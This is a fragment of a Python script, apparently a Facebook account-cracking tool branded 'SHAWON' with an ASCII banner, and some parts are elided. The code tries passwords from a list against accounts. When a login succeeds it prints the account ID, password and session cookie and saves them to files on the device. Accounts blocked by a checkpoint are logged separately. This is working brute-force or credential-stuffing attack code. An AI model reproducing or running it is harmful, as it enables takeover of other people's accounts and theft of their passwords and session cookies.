...
logo = (""""\033[132m  ____  _   _    ___        _____  _   _  
 / ___|| | | |  / \ \      / / _ \| \ | | 
 \___ \| |_| | / _ \ \ /\ / / | | |  \| | 
  ___) |  _  |/ ___ \ V  V /| |_| | |\  | 
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[SHAWON -OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SHAWON -OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[SHAWON -CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SHAWON -CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[SHAWON ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
